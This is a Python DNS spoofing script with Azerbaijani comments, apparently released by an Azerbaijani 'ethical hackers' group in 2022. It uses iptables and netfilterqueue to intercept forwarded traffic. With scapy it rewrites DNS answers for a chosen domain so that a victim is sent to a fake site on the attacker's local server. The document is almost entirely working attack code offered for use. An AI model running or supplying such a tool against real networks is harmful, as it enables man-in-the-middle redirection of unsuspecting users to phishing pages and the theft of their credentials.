# Azərbaycan dilində intefeysi olan alət.
# DNS Yönləndirmə
# O.G.A aləti işə salındıqdan sonra (hədəf internetlə təmin edilməlidir!),
# hədəf qurğu və hədəf Domain yaxud İP ünvan daxil edilir.
# hədəfin daxil olmaq istədiyi ünvan lokal serverdə saxta olaraq hazırlanmış ünvana yönləndirilir.
# Hazırladı Orxan Bayramov.
# Yazılım dili Python 3
# 2022-ci il https://www.kht.az
# !/usr/bin/env/ python
import subprocess
import netfilterqueue
import scapy.all as scapy
import netifaces
import netifaces as ni


def printbanner():
    subprocess.call(["clear"])
    print("██   ██ ██   ██  █████   ██████   █████  ███    ██    AZERBAIJAN")
    print("██  ██  ██   ██ ██   ██ ██       ██   ██ ████   ██      ETHICAL ")
    print("█████   ███████ ███████ ██   ███ ███████ ██ ██  ██      HACKERS ")
    print("██  ██  ██   ██ ██   ██ ██    ██ ██   ██ ██  ██ ██       TEAM")
    print("██   ██ ██   ██ ██   ██  ██████  ██   ██ ██   ████  https://kht.az\n")

def process_packet(packet):
    gw_device = netifaces.gateways()["default"]
    adapter = gw_device[netifaces.AF_INET][1]
    ip = ni.ifaddresses(adapter)[ni.AF_INET][0]['addr']
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if domain in str(qname):
            print(" [+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

domain = input(" [*] Yönləndiriləcək domain və ya İP ünvanı yazın: ")
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

try:
    while True:
        printbanner()
        print(" [*] Çıxış üçün << CTRL + C >>")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("\n [+] CTRL + C .... Yönləndirmə dayandırıldı!")
